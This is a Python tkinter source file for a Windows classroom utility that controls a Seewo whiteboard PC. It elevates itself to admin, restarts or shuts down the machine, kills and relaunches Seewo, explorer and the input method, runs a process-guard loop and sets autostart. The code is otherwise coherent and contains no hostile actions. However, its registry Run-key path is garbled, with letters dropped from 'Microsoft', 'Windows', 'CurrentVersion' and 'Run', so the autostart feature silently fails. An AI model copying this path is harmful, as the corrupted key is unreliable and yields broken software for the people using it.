import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import os
import sys
import json
import subprocess
import psutil
import ctypes
from ctypes import wintypes
import winreg
import threading
import time
import logging
import io
import datetime
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()
class ConsoleHandler(logging.Handler):
    def __init__(self):
        super().__init__()
        self.log_records = []
    def emit(self, record):
        log_entry = self.format(record)
        self.log_records.append(log_entry)
logger = logging.getLogger('vcClass')
logger.setLevel(logging.INFO)
console_handler = ConsoleHandler()
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
console_handler.setFormatter(formatter)
logger.addHandler(console_handler)
class RoundedButton(tk.Canvas):
    """自定义圆角按钮"""
    def __init__(self, parent, text, command=None, width=100, height=30,
                 corner_radius=10, bg_color='#4a7abc', fg_color='white',
                 hover_color='#3a6aac', **kwargs):
        super().__init__(parent, width=width, height=height,
                         highlightthickness=0, bg='#2b2b2b', **kwargs)
        self.command = command
        self.corner_radius = corner_radius
        self.bg_color = bg_color
        self.fg_color = fg_color
        self.hover_color = hover_color
        self.text = text
        self.width = width
        self.height = height
        self.bind("<Enter>", self.on_enter)
        self.bind("<Leave>", self.on_leave)
        self.bind("<Button-1>", self.on_click)
        self.draw_button()
    def draw_button(self, color=None):
        self.delete("all")
        if color is None:
            color = self.bg_color
        self.create_rounded_rect(0, 0, self.width, self.height,
                                 self.corner_radius, fill=color, outline="")
        self.create_text(self.width / 2, self.height / 2, text=self.text,
                         fill=self.fg_color, font=("微软雅黑", 9))
    def create_rounded_rect(self, x1, y1, x2, y2, r, **kwargs):
        points = [x1 + r, y1,
                  x2 - r, y1,
                  x2, y1,
                  x2, y1 + r,
                  x2, y2 - r,
                  x2, y2,
                  x2 - r, y2,
                  x1 + r, y2,
                  x1, y2,
                  x1, y2 - r,
                  x1, y1 + r,
                  x1, y1]
        return self.create_polygon(points, **kwargs, smooth=True)
    def on_enter(self, event):
        self.draw_button(self.hover_color)
    def on_leave(self, event):
        self.draw_button(self.bg_color)
    def on_click(self, event):
        if self.command:
            self.command()
class VcClassApp:
    def __init__(self, root):
        self.root = root
        self.root.title("希沃快捷操作程序")
        self.config_file = "vcClass_config.json"
        self.config = self.load_config()
        logger.info("希沃快捷操作程序启动")
        self.setup_window()
        self.setup_dark_theme()
        self.create_widgets()
        self.update_window_behavior()
        if not self.config.get("show_console_on_startup", False):
            self.hide_console(show_message=False)
        if self.config.get("guard_process", False):
            self.start_process_guard()
    def setup_window(self):
        """设置窗口属性和位置"""
        window_width = 800
        window_height = 200
        self.root.geometry(f"{window_width}x{window_height}")
        self.root.resizable(False, False)
        self.root.attributes("-alpha", self.config.get("window_alpha", 0.5))
        self.root.config(bg='#2b2b2b')
        self.set_window_icon(self.root)
        self.root.update_idletasks()
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        x = screen_width - window_width - 20  
        y = screen_height - window_height - 60  
        self.root.geometry(f"+{x}+{y}")
        self.root.deiconify()
    def set_window_icon(self, window):
        """设置窗口图标"""
        try:
            icon_path = "favicon.ico"
            if os.path.exists(icon_path):
                window.iconbitmap(icon_path)
            else:
                pass
        except Exception as e:
            logger.error(f"设置窗口图标时出错: {e}")
    def setup_dark_theme(self):
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('.',
                        background='#2b2b2b',
                        foreground='#ffffff',
                        fieldbackground='#3c3c3c',
                        selectbackground='#4a7abc',
                        selectforeground='#ffffff',
                        troughcolor='#3c3c3c',
                        focuscolor='#4a7abc')
        style.configure('Rounded.TButton',
                        borderwidth=0,
                        focuscolor='none',
                        relief='flat',
                        background='#4a7abc',
                        foreground='white',
                        padding=(10, 5))
        style.map('Rounded.TButton',
                  background=[('active', '#3a6aac')])
        style.configure('Rounded.TCheckbutton',
                        background='#2b2b2b',
                        foreground='#ffffff',
                        focuscolor='none')
        style.map('Rounded.TCheckbutton',
                  background=[('active', '#2b2b2b')])
        style.configure('TLabelframe',
                        background='#2b2b2b',
                        foreground='#ffffff')
        style.configure('TLabelframe.Label',
                        background='#2b2b2b',
                        foreground='#ffffff')
        style.configure('TFrame',
                        background='#2b2b2b')
    def load_config(self):
        default_config = {
            "seewo_path": "",
            "seewo_process_name": "EasiNote5.exe",
            "window_movable": False,
            "always_on_top": False,
            "guard_process": False,
            "guard_program_path": "",
            "guard_program_name": "",
            "autostart": False,
            "window_alpha": 0.5,
            "show_console_on_startup": False
        }
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r', encoding='utf-8') as f:
                    loaded_config = json.load(f)
                    for key, value in default_config.items():
                        if key not in loaded_config:
                            loaded_config[key] = value
                    return loaded_config
        except Exception as e:
            logger.error(f"加载配置时出错: {e}")
        return default_config
    def save_config(self):
        try:
            with open(self.config_file, 'w', encoding='utf-8') as f:
                json.dump(self.config, f, ensure_ascii=False, indent=2)
        except Exception as e:
            logger.error(f"保存配置时出错: {e}")
    def create_widgets(self):
        main_frame = ttk.Frame(self.root, padding="5")
        main_frame.pack(fill=tk.BOTH, expand=True)
        left_frame = ttk.LabelFrame(main_frame, text="常用操作", padding="5")
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        RoundedButton(left_frame, text="重启电脑", width=120, height=35,
                      command=self.restart_computer).pack(fill=tk.X, pady=2)
        RoundedButton(left_frame, text="关机", width=120, height=35,
                      command=self.shutdown_computer).pack(fill=tk.X, pady=2)
        RoundedButton(left_frame, text="重启希沃白板5", width=120, height=30,
                      command=self.restart_seewo).pack(fill=tk.X, pady=2)
        middle_frame = ttk.LabelFrame(main_frame, text="系统工具", padding="5")
        middle_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
        tools_row1 = ttk.Frame(middle_frame)
        tools_row1.pack(fill=tk.X, pady=2)
        RoundedButton(tools_row1, text="声音设置", width=90, height=30,
                      command=self.open_sound_selector).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
        RoundedButton(tools_row1, text="重启explorer", width=90, height=30,
                      command=self.restart_explorer).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
        RoundedButton(tools_row1, text="重启输入法", width=90, height=30,
                      command=self.restart_ime).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
        tools_row2 = ttk.Frame(middle_frame)
        tools_row2.pack(fill=tk.X, pady=2)
        RoundedButton(tools_row2, text="注册表", width=90, height=30,
                      command=self.open_regedit).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
        RoundedButton(tools_row2, text="CMD", width=90, height=30,
                      command=self.open_cmd).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
        RoundedButton(tools_row2, text="系统设置", width=90, height=30,
                      command=self.open_system_settings).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
        tools_row3 = ttk.Frame(middle_frame)
        tools_row3.pack(fill=tk.X, pady=2)
        RoundedButton(tools_row3, text="启动希沃白板5", width=90, height=30,
                      command=self.start_seewo).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
        RoundedButton(tools_row3, text="终止希沃白板5", width=90, height=30,
                      command=self.kill_all_seewo).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
        tools_row4 = ttk.Frame(middle_frame)
        tools_row4.pack(fill=tk.X, pady=2)
        RoundedButton(tools_row4, text="隐藏控制台", width=90, height=30,
                      command=self.hide_console).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
        RoundedButton(tools_row4, text="显示控制台", width=90, height=30,
                      command=self.show_console).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
        right_frame = ttk.LabelFrame(main_frame, text="设置", padding="5")
        right_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(5, 0))
        self.movable_var = tk.BooleanVar(value=self.config.get("window_movable", False))
        movable_cb = ttk.Checkbutton(right_frame, text="窗口可移动",
                                     variable=self.movable_var,
                                     command=self.toggle_movable)
        movable_cb.pack(anchor=tk.W, pady=2)
        self.ontop_var = tk.BooleanVar(value=self.config.get("always_on_top", False))
        ontop_cb = ttk.Checkbutton(right_frame, text="始终置顶",
                                   variable=self.ontop_var,
                                   command=self.toggle_ontop)
        ontop_cb.pack(anchor=tk.W, pady=2)
        self.guard_var = tk.BooleanVar(value=self.config.get("guard_process", False))
        guard_cb = ttk.Checkbutton(right_frame, text="守护进程",
                                   variable=self.guard_var,
                                   command=self.toggle_guard)
        guard_cb.pack(anchor=tk.W, pady=2)
        self.autostart_var = tk.BooleanVar(value=self.config.get("autostart", False))
        autostart_cb = ttk.Checkbutton(right_frame, text="开机自启动",
                                       variable=self.autostart_var,
                                       command=self.toggle_autostart)
        autostart_cb.pack(anchor=tk.W, pady=2)
        settings_btn_frame = ttk.Frame(right_frame)
        settings_btn_frame.pack(fill=tk.X, pady=5)
        RoundedButton(settings_btn_frame, text="程序设置", width=90, height=30,
                      command=self.open_settings).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
        RoundedButton(settings_btn_frame, text="关于", width=90, height=30,
                      command=self.show_about).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
    def update_window_behavior(self):
        if not self.config.get("window_movable", False):
            self.root.overrideredirect(True)
        else:
            self.root.overrideredirect(False)
        self.root.attributes("-topmost", self.config.get("always_on_top", False))
        self.root.attributes("-alpha", self.config.get("window_alpha", 0.5))
        self.root.deiconify()
    def toggle_movable(self):
        self.config["window_movable"] = self.movable_var.get()
        self.save_config()
        self.update_window_behavior()
        if self.movable_var.get():
            messagebox.showinfo("提示", "窗口现在可以移动了")
            logger.info("窗口设置为可移动")
        else:
            messagebox.showinfo("提示", "窗口已固定")
            logger.info("窗口设置为固定")
    def toggle_ontop(self):
        self.config["always_on_top"] = self.ontop_var.get()
        self.save_config()
        self.update_window_behavior()
        if self.ontop_var.get():
            logger.info("窗口设置为始终置顶")
        else:
            logger.info("窗口取消始终置顶")
    def toggle_guard(self):
        self.config["guard_process"] = self.guard_var.get()
        self.save_config()
        if self.guard_var.get():
            if not self.config.get("guard_program_path") or not self.config.get("guard_program_name"):
                messagebox.showwarning("警告", "请先在程序设置中设置要守护的程序路径和名称")
                self.guard_var.set(False)
                self.config["guard_process"] = False
                self.save_config()
                return
            self.start_process_guard()
            messagebox.showinfo("提示", "已开启进程守护")
            logger.info("开启进程守护")
        else:
            messagebox.showinfo("提示", "已关闭进程守护")
            logger.info("关闭进程守护")
    def toggle_autostart(self):
        self.config["autostart"] = self.autostart_var.get()
        self.save_config()
        self.set_autostart()
        if self.autostart_var.get():
            logger.info("设置开机自启动")
        else:
            logger.info("取消开机自启动")
    def update_alpha(self, value):
        """更新窗口透明度"""
        alpha_value = float(value)
        self.config["window_alpha"] = alpha_value
        self.root.attributes("-alpha", alpha_value)
        self.save_config()
        logger.info(f"窗口透明度设置为: {alpha_value}")
    def start_process_guard(self):
        """启动进程守护线程"""
        if not hasattr(self, 'guard_thread') or not self.guard_thread.is_alive():
            self.guard_thread = threading.Thread(target=self.process_guard, daemon=True)
            self.guard_thread.start()
            logger.info("进程守护线程已启动")
    def process_guard(self):
        """进程守护功能"""
        program_path = self.config.get("guard_program_path", "")
        program_name = self.config.get("guard_program_name", "")
        if not program_path or not program_name:
            logger.error("进程守护: 未设置程序路径或名称")
            return
        logger.info(f"开始进程守护，监控进程: {program_name}")
        while self.config.get("guard_process", False):
            process_found = False
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'].lower() == program_name.lower():
                        process_found = True
                        break
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
            if not process_found and program_path and os.path.exists(program_path):
                try:
                    subprocess.Popen(program_path)
                    logger.info(f"守护进程: 已启动 {program_name}")
                except Exception as e:
                    logger.error(f"守护进程: 启动失败 - {e}")
            time.sleep(10)
    def restart_computer(self):
        logger.info("用户请求重启电脑")
        if messagebox.askyesno("确认", "确定要重启电脑吗？"):
            logger.info("确认重启电脑")
            os.system("shutdown /r /t 0")
        else:
            logger.info("取消重启电脑")
    def shutdown_computer(self):
        logger.info("用户请求关机")
        if messagebox.askyesno("确认", "确定要关机吗？"):
            logger.info("确认关机")
            os.system("shutdown /s /t 0")
        else:
            logger.info("取消关机")
    def restart_seewo(self):
        logger.info("用户请求重启希沃白板5")
        path = self.config.get("seewo_path", "")
        process_name = self.config.get("seewo_process_name", "EasiNote5.exe")
        if not path or not os.path.exists(path):
            logger.warning("希沃白板5路径未设置或无效")
            messagebox.showwarning("警告", "请先设置希沃白板5的路径")
            self.open_settings()
            return
        logger.info(f"重启希沃白板5，路径: {path}")
        self.kill_process_by_name(process_name)
        subprocess.Popen(path)
        messagebox.showinfo("成功", "希沃白板5已重启")
        logger.info("希沃白板5已重启")
    def start_seewo(self):
        logger.info("用户请求启动希沃白板5")
        path = self.config.get("seewo_path", "")
        if not path or not os.path.exists(path):
            logger.warning("希沃白板5路径未设置或无效")
            messagebox.showwarning("警告", "请先设置希沃白板5的路径")
            self.open_settings()
            return
        logger.info(f"启动希沃白板5，路径: {path}")
        subprocess.Popen(path)
        logger.info("希沃白板5已启动")
    def kill_all_seewo(self):
        logger.info("开始终止所有希沃相关进程")
        process_name = self.config.get("seewo_process_name", "EasiNote5.exe")
        killed = self.kill_process_by_name(process_name)
        if killed > 0:
            messagebox.showinfo("成功", f"已终止 {killed} 个希沃相关进程")
            logger.info(f"成功终止 {killed} 个希沃相关进程")
        else:
            messagebox.showinfo("提示", "未找到运行的希沃进程")
            logger.info("未找到运行的希沃进程")
    def kill_process_by_name(self, process_name):
        """根据进程名称终止进程"""
        killed = 0
        for proc in psutil.process_iter(['name']):
            try:
                proc_name = proc.info['name'].lower()
                if process_name.lower() in proc_name:
                    proc.kill()
                    killed += 1
                    logger.info(f"已终止进程: {proc_name}")
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        return killed
    def open_sound_selector(self):
        """打开声音设置选择窗口"""
        logger.info("用户打开声音设置选择窗口")
        sound_win = tk.Toplevel(self.root)
        sound_win.title("声音设置")
        sound_win.geometry("300x150")
        sound_win.resizable(False, False)
        sound_win.config(bg='#2b2b2b')
        sound_win.attributes("-alpha", self.config.get("window_alpha", 0.5))
        sound_win.attributes("-topmost", True)
        self.set_window_icon(sound_win)
        title_label = ttk.Label(sound_win, text="选择声音设置类型",
                                font=("微软雅黑", 10, "bold"),
                                background='#2b2b2b', foreground='#ffffff')
        title_label.pack(pady=10)
        button_frame = ttk.Frame(sound_win)
        button_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        RoundedButton(button_frame, text="音量合成器", width=120, height=30,
                      command=lambda: [self.open_volume_mixer(), sound_win.destroy()]).pack(pady=5)
        RoundedButton(button_frame, text="声音控制面板", width=120, height=30,
                      command=lambda: [self.open_sound_control_panel(), sound_win.destroy()]).pack(pady=5)
        RoundedButton(button_frame, text="声音设置", width=120, height=30,
                      command=lambda: [self.open_sound_settings(), sound_win.destroy()]).pack(pady=5)
    def open_volume_mixer(self):
        """打开音量合成器"""
        logger.info("用户打开音量合成器")
        try:
            subprocess.Popen("sndvol.exe")
            logger.info("音量合成器已打开")
        except Exception as e:
            logger.error(f"无法打开音量合成器: {e}")
            messagebox.showerror("错误", f"无法打开音量合成器: {e}")
    def open_sound_control_panel(self):
        """打开声音控制面板"""
        logger.info("用户打开声音控制面板")
        try:
            subprocess.Popen("control mmsys.cpl sounds")
            logger.info("声音控制面板已打开")
        except Exception as e:
            logger.error(f"无法打开声音控制面板: {e}")
            messagebox.showerror("错误", f"无法打开声音控制面板: {e}")
    def open_sound_settings(self):
        """打开声音设置"""
        logger.info("用户打开声音设置")
        try:
            subprocess.Popen("start ms-settings:sound", shell=True)
            logger.info("声音设置已打开")
        except Exception as e:
            logger.error(f"无法打开声音设置: {e}")
            messagebox.showerror("错误", f"无法打开声音设置: {e}")
    def restart_explorer(self):
        logger.info("用户请求重启资源管理器")
        if messagebox.askyesno("确认", "确定要重启资源管理器吗？"):
            logger.info("确认重启资源管理器")
            os.system("taskkill /f /im explorer.exe")
            subprocess.Popen("explorer.exe")
            messagebox.showinfo("成功", "资源管理器已重启")
            logger.info("资源管理器已重启")
        else:
            logger.info("取消重启资源管理器")
    def restart_ime(self):
        logger.info("用户请求重启输入法")
        if messagebox.askyesno("确认", "确定要重启输入法吗？"):
            logger.info("确认重启输入法")
            os.system("taskkill /f /im ctfmon.exe")
            subprocess.Popen("ctfmon.exe")
            messagebox.showinfo("成功", "输入法已重启")
            logger.info("输入法已重启")
        else:
            logger.info("取消重启输入法")
    def open_regedit(self):
        logger.info("用户打开注册表")
        subprocess.Popen("regedit.exe")
        logger.info("注册表已打开")
    def open_cmd(self):
        logger.info("用户打开CMD")
        subprocess.Popen("cmd.exe", creationflags=subprocess.CREATE_NEW_CONSOLE)
        logger.info("CMD已打开")
    def open_system_settings(self):
        logger.info("用户打开系统设置")
        try:
            subprocess.Popen("start ms-settings:", shell=True)
            logger.info("系统设置已打开")
        except Exception as e:
            logger.error(f"无法打开系统设置: {e}")
            messagebox.showerror("错误", f"无法打开系统设置: {e}")
    def set_autostart(self):
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Mcrosoft\Wndows\CrrentVersion\Rn"
            if self.config.get("autostart", False):
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                    winreg.SetValueEx(reg_key, "vcClass", 0, winreg.REG_SZ, sys.executable)
                messagebox.showinfo("成功", "已设置开机自启动")
                logger.info("已设置开机自启动")
            else:
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                    try:
                        winreg.DeleteValue(reg_key, "vcClass")
                        messagebox.showinfo("成功", "已取消开机自启动")
                        logger.info("已取消开机自启动")
                    except FileNotFoundError:
                        pass
        except Exception as e:
            logger.error(f"设置开机自启动失败: {str(e)}")
            messagebox.showerror("错误", f"设置开机自启动失败: {str(e)}")
    def open_settings(self):
        logger.info("用户打开程序设置")
        settings_win = tk.Toplevel(self.root)
        settings_win.title("程序设置")
        settings_win.geometry("500x600")
        settings_win.resizable(False, False)
        settings_win.config(bg='#2b2b2b')  
        settings_win.attributes("-alpha", self.config.get("window_alpha", 0.5))  
        settings_win.attributes("-topmost", True)  
        self.set_window_icon(settings_win)
        seewo_frame = ttk.LabelFrame(settings_win, text="希沃白板5设置", padding="10")
        seewo_frame.pack(fill=tk.X, padx=10, pady=10)
        seewo_path_frame = ttk.Frame(seewo_frame)
        seewo_path_frame.pack(fill=tk.X, pady=5)
        ttk.Label(seewo_path_frame, text="程序路径:").pack(side=tk.LEFT)
        seewo_path_var = tk.StringVar(value=self.config.get("seewo_path", ""))
        seewo_path_entry = ttk.Entry(seewo_path_frame, textvariable=seewo_path_var, width=40)
        seewo_path_entry.pack(side=tk.LEFT, padx=(5, 10), fill=tk.X, expand=True)
        def browse_seewo_path():
            file_path = filedialog.askopenfilename(
                title="选择希沃白板5可执行文件",
                filetypes=[("可执行文件", "*.exe"), ("所有文件", "*.*")]
            )
            if file_path:
                seewo_path_var.set(file_path)
                program_name = os.path.basename(file_path)
                seewo_name_var.set(program_name)
                logger.info(f"选择希沃白板5路径: {file_path}, 自动设置进程名: {program_name}")
        RoundedButton(seewo_path_frame, text="浏览", width=60, height=25,
                      command=browse_seewo_path).pack(side=tk.RIGHT)
        seewo_name_frame = ttk.Frame(seewo_frame)
        seewo_name_frame.pack(fill=tk.X, pady=5)
        ttk.Label(seewo_name_frame, text="进程名称:").pack(side=tk.LEFT)
        seewo_name_var = tk.StringVar(value=self.config.get("seewo_process_name", "EasiNote5.exe"))
        seewo_name_entry = ttk.Entry(seewo_name_frame, textvariable=seewo_name_var, width=20)
        seewo_name_entry.pack(side=tk.LEFT, padx=(5, 0))
        guard_frame = ttk.LabelFrame(settings_win, text="进程守护设置", padding="10")
        guard_frame.pack(fill=tk.X, padx=10, pady=10)
        guard_path_frame = ttk.Frame(guard_frame)
        guard_path_frame.pack(fill=tk.X, pady=5)
        ttk.Label(guard_path_frame, text="程序路径:").pack(side=tk.LEFT)
        guard_path_var = tk.StringVar(value=self.config.get("guard_program_path", ""))
        guard_path_entry = ttk.Entry(guard_path_frame, textvariable=guard_path_var, width=40)
        guard_path_entry.pack(side=tk.LEFT, padx=(5, 10), fill=tk.X, expand=True)
        def browse_guard_path():
            file_path = filedialog.askopenfilename(
                title="选择要守护的程序",
                filetypes=[("可执行文件", "*.exe"), ("所有文件", "*.*")]
            )
            if file_path:
                guard_path_var.set(file_path)
                program_name = os.path.basename(file_path)
                guard_name_var.set(program_name)
                logger.info(f"选择守护程序路径: {file_path}, 自动设置程序名: {program_name}")
        RoundedButton(guard_path_frame, text="浏览", width=60, height=25,
                      command=browse_guard_path).pack(side=tk.RIGHT)
        guard_name_frame = ttk.Frame(guard_frame)
        guard_name_frame.pack(fill=tk.X, pady=5)
        ttk.Label(guard_name_frame, text="进程名称:").pack(side=tk.LEFT)
        guard_name_var = tk.StringVar(value=self.config.get("guard_program_name", ""))
        guard_name_entry = ttk.Entry(guard_name_frame, textvariable=guard_name_var, width=20)
        guard_name_entry.pack(side=tk.LEFT, padx=(5, 0))
        alpha_frame = ttk.LabelFrame(settings_win, text="窗口透明度设置", padding="10")
        alpha_frame.pack(fill=tk.X, padx=10, pady=10)
        alpha_label = ttk.Label(alpha_frame, text="透明度:")
        alpha_label.pack(side=tk.LEFT)
        alpha_var = tk.DoubleVar(value=self.config.get("window_alpha", 0.5))
        alpha_scale = ttk.Scale(alpha_frame, from_=0.1, to=1.0, orient=tk.HORIZONTAL,
                                variable=alpha_var, command=self.update_alpha)
        alpha_scale.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=10)
        alpha_value_label = ttk.Label(alpha_frame, text=f"{alpha_var.get():.1f}")
        alpha_value_label.pack(side=tk.RIGHT)
        def update_alpha_label(value):
            alpha_value_label.config(text=f"{float(value):.1f}")
        alpha_scale.config(command=lambda v: [self.update_alpha(v), update_alpha_label(v)])
        console_frame = ttk.LabelFrame(settings_win, text="控制台设置", padding="10")
        console_frame.pack(fill=tk.X, padx=10, pady=10)
        console_startup_var = tk.BooleanVar(value=self.config.get("show_console_on_startup", False))
        console_startup_cb = ttk.Checkbutton(console_frame, text="启动时显示控制台",
                                             variable=console_startup_var)
        console_startup_cb.pack(anchor=tk.W)
        button_frame = ttk.Frame(settings_win)
        button_frame.pack(fill=tk.X, padx=10, pady=10)
        def save_settings():
            self.config["seewo_path"] = seewo_path_var.get()
            self.config["seewo_process_name"] = seewo_name_var.get()
            self.config["guard_program_path"] = guard_path_var.get()
            self.config["guard_program_name"] = guard_name_var.get()
            self.config["show_console_on_startup"] = console_startup_var.get()
            self.save_config()
            settings_win.destroy()
            messagebox.showinfo("成功", "设置已保存")
            logger.info("程序设置已保存")
            if self.config.get("guard_process", False):
                self.start_process_guard()
        def reset_settings():
            if messagebox.askyesno("确认", "确定要恢复默认设置吗？这将清除所有自定义设置。"):
                default_config = {
                    "seewo_path": "",
                    "seewo_process_name": "EasiNote5.exe",
                    "window_movable": False,
                    "always_on_top": False,
                    "guard_process": False,
                    "guard_program_path": "",
                    "guard_program_name": "",
                    "autostart": False,
                    "window_alpha": 0.5,
                    "show_console_on_startup": False
                }
                self.config = default_config
                self.save_config()
                self.movable_var.set(False)
                self.ontop_var.set(False)
                self.guard_var.set(False)
                self.autostart_var.set(False)
                self.update_window_behavior()
                settings_win.destroy()
                messagebox.showinfo("成功", "已恢复默认设置")
                logger.info("已恢复默认设置")
        def terminate_program():
            if messagebox.askyesno("确认", "确定要终止程序吗？"):
                logger.info("用户终止程序")
                settings_win.destroy()
                self.root.quit()
                sys.exit()
        button_container = ttk.Frame(settings_win)
        button_container.pack(fill=tk.X, padx=10, pady=10)
        button_row1 = ttk.Frame(button_container)
        button_row1.pack(fill=tk.X, pady=5)
        RoundedButton(button_row1, text="保存", width=100, height=30,
                      command=save_settings).pack(side=tk.LEFT, padx=5)
        RoundedButton(button_row1, text="恢复默认设置", width=120, height=30,
                      command=reset_settings).pack(side=tk.LEFT, padx=5)
        RoundedButton(button_row1, text="取消", width=100, height=30,
                      command=settings_win.destroy).pack(side=tk.RIGHT, padx=5)
        button_row2 = ttk.Frame(button_container)
        button_row2.pack(fill=tk.X, pady=5)
        RoundedButton(button_row2, text="终止程序", width=120, height=30,
                      command=terminate_program).pack(side=tk.LEFT, padx=5)
    def hide_console(self, show_message=True):
        try:
            console_window = ctypes.windll.kernel32.GetConsoleWindow()
            if console_window:
                ctypes.windll.user32.ShowWindow(console_window, 0)  
                if show_message:
                    messagebox.showinfo("提示", "控制台已隐藏")
                logger.info("控制台已隐藏")
        except:
            if show_message:
                messagebox.showinfo("提示", "控制台已隐藏")
            logger.info("控制台已隐藏")
    def show_console(self):
        try:
            console_window = ctypes.windll.kernel32.GetConsoleWindow()
            if console_window:
                ctypes.windll.user32.ShowWindow(console_window, 5)  
                messagebox.showinfo("提示", "控制台已显示")
                print("=" * 50)
                print("控制台日志记录")
                print("=" * 50)
                for record in console_handler.log_records:
                    print(record)
                print("=" * 50)
                logger.info("控制台已显示，输出所有日志记录")
        except:
            messagebox.showinfo("提示", "控制台已显示")
            logger.info("控制台已显示")
    def show_about(self):
        logger.info("用户打开关于窗口")
        about_win = tk.Toplevel(self.root)
        about_win.title("关于")
        about_win.geometry("400x400")
        about_win.resizable(False, False)
        about_win.config(bg='#2b2b2b')
        about_win.attributes("-alpha", self.config.get("window_alpha", 0.5))
        about_win.attributes("-topmost", True)
        self.set_window_icon(about_win)
        title_label = tk.Label(about_win, text="关于",
                               font=("微软雅黑", 16, "bold"),
                               bg='#2b2b2b', fg='#ffffff')
        title_label.pack(pady=(20, 10))
        content_text = """程序：VerCoreClass
版本：beta 0.1
作者：missdeep(daijunning 2024)
bilibili：https://space.bilibili.com/3461581692210041?spm_id_from=333.1007.0.0
github:https://github.com/missdeep/vcClass"""
        content_label = tk.Label(about_win, text=content_text,
                                 font=("微软雅黑", 11),
                                 bg='#2b2b2b', fg='#ffffff',
                                 justify=tk.CENTER)
        content_label.pack(pady=10)
        try:
            icon_path = "favicon.ico"
            if os.path.exists(icon_path):
                pass
            icon_canvas = tk.Canvas(about_win, width=80, height=80,
                                    bg='#2b2b2b', highlightthickness=0)
            icon_canvas.pack(pady=10)
            icon_canvas.create_oval(10, 10, 70, 70, fill='#4a7abc', outline='')
            icon_canvas.create_text(40, 40, text="VC", fill='white', font=("微软雅黑", 12, "bold"))
        except Exception as e:
            logger.error(f"创建图标时出错: {e}")
        copyright_label = tk.Label(about_win,
                                   text="Copyright @ 2025 Vercore.icu 版权所有",
                                   font=("微软雅黑", 9),
                                   bg='#2b2b2b', fg='#aaaaaa')
        copyright_label.pack(pady=(20, 10))
        RoundedButton(about_win, text="关闭", width=80, height=30,
                      command=about_win.destroy).pack(pady=10)
if __name__ == "__main__":
    try:
        root = tk.Tk()
        app = VcClassApp(root)
        root.mainloop()
    except Exception as e:
        print(f"程序启动错误: {e}")
        input("按回车键退出...")